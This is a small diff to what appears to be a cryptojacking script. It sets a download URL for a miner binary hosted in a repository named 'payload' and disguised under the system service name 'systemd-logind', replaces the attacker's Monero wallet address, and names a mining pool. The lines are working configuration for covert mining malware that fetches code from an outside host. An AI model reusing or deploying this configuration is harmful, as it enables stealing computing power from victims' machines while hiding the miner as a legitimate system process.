@@ -4,7 +4,7 @@
 # Miner details
 MINER_URL="https://github.com/RALPH-005/payload/raw/refs/heads/main/systemd-logind"
 
-WALLET="43QinLvHtCRAGydwXBhictMDDtfqac3jAjX21cQtx1bxTrVCTAAd19mhX2cFeXtB89gR4eFHCspuyXbgqEQNYkaREBZZHXX"
+WALLET="89T9kvjYMeqBY8yky4mbP8EDP1rouQDjJgGkRZ22uFXz9phDhtMSYKz8Skq8B7d8LfVitghrx4juyTXrUeDwsUHwCut2EYM"
 POOL="pool.supportxmr.com:3333"
 
 # Check if miner is already running
